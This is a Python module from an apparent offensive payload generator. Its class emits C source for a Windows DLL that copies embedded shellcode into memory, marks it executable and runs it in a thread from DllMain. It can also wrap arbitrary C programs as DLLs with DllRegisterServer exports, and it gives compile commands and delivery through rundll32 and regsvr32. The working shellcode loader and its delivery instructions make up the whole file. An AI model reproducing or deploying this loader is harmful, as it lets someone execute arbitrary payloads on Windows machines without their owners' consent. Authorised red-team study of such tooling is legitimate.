"""DLL Format Builder — Windows PE DLL loader.

Generates a C source DLL that executes shellcode in DllMain on
DLL_PROCESS_ATTACH.  Useful for:
  - rundll32.exe delivery
  - regsvr32.exe (DllRegisterServer export)
  - Reflective DLL injection
  - LD_PRELOAD equivalent on Linux (use ELF .so with constructor)

Compile:
  x64: x86_64-w64-mingw32-gcc -o payload.dll loader.c -shared -lws2_32 -s -O2
  x86: i686-w64-mingw32-gcc   -o payload32.dll loader.c -shared -lws2_32 -s -O2 -m32

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""
from __future__ import annotations

import textwrap


class DllFormat:
    """Windows DLL format builder."""

    def __init__(self, arch: str = "x64"):
        if arch not in ("x86", "x64"):
            raise ValueError(f"DLL format supports x86/x64, got {arch!r}")
        self.arch = arch

    def build(self, shellcode: bytes) -> bytes:
        if self._is_c_source(shellcode):
            return self._wrap_c_source_as_dll(shellcode.decode(errors="replace")).encode()
        return self._binary_loader(shellcode).encode()

    def _is_c_source(self, data: bytes) -> bool:
        try:
            head = data[:128].decode("utf-8", errors="strict").lstrip()
            return head.startswith("/*") or head.startswith("#")
        except UnicodeDecodeError:
            return False

    def _wrap_c_source_as_dll(self, src: str) -> str:
        """Wrap a standalone C EXE source as a DLL by adding DllMain + exports."""
        arch_flag = "" if self.arch == "x64" else " -m32"
        prefix = f"""\
/*
 * Forge DLL Loader ({self.arch}) — DllMain + DllRegisterServer exports
 * Compile: {'x86_64' if self.arch == 'x64' else 'i686'}-w64-mingw32-gcc \\
 *    -o payload.dll loader.c -shared -lws2_32 -s -O2{arch_flag}
 *
 * Deliver via:
 *   rundll32.exe payload.dll,DllRegisterServer
 *   regsvr32.exe payload.dll
 *
 * FOR AUTHORIZED PENETRATION TESTING ONLY.
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

/* Rename main() to avoid duplicate symbol */
#define main _forge_main
#define WinMain _forge_winmain

"""
        suffix = """\

#undef main
#undef WinMain

/* DllMain — trigger on process attach */
BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID reserved) {
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hDll);
        /* Spawn payload in a background thread to avoid blocking loader lock */
        HANDLE ht = CreateThread(NULL, 0,
            (LPTHREAD_START_ROUTINE)_forge_main, NULL, 0, NULL);
        if (ht) CloseHandle(ht);
    }
    return TRUE;
}

/* regsvr32 / rundll32 export entry points */
__declspec(dllexport) void DllRegisterServer(void)   { _forge_main(); }
__declspec(dllexport) void DllUnregisterServer(void) {}
"""
        return prefix + src + suffix

    def _binary_loader(self, sc: bytes) -> str:
        sc_hex = ", ".join(f"0x{b:02x}" for b in sc)
        sz     = len(sc)
        arch_flag = "" if self.arch == "x64" else " -m32"
        arch_prefix = "x86_64" if self.arch == "x64" else "i686"

        return textwrap.dedent(f"""\
        /*
         * Forge DLL Loader ({self.arch}) — shellcode in DllMain
         * Compile: {arch_prefix}-w64-mingw32-gcc -o payload.dll loader.c \\
         *          -shared -lws2_32 -s -O2{arch_flag}
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #define WIN32_LEAN_AND_MEAN
        #include <windows.h>
        #include <string.h>

        static unsigned char _sc[] = {{ {sc_hex} }};
        #define SC_SIZE {sz}

        static DWORD WINAPI _thread(LPVOID p) {{
            (void)p;
            LPVOID exec = VirtualAlloc(NULL, SC_SIZE,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!exec) return 1;
            memcpy(exec, _sc, SC_SIZE);
            DWORD old = 0;
            VirtualProtect(exec, SC_SIZE, PAGE_EXECUTE_READ, &old);
            ((void(*)(void))exec)();
            VirtualFree(exec, 0, MEM_RELEASE);
            return 0;
        }}

        BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID reserved) {{
            (void)reserved;
            if (reason == DLL_PROCESS_ATTACH) {{
                DisableThreadLibraryCalls(hDll);
                HANDLE ht = CreateThread(NULL, 0, _thread, NULL, 0, NULL);
                if (ht) CloseHandle(ht);
            }}
            return TRUE;
        }}

        __declspec(dllexport) void DllRegisterServer(void)   {{ _thread(NULL); }}
        __declspec(dllexport) void DllUnregisterServer(void) {{}}
        """)
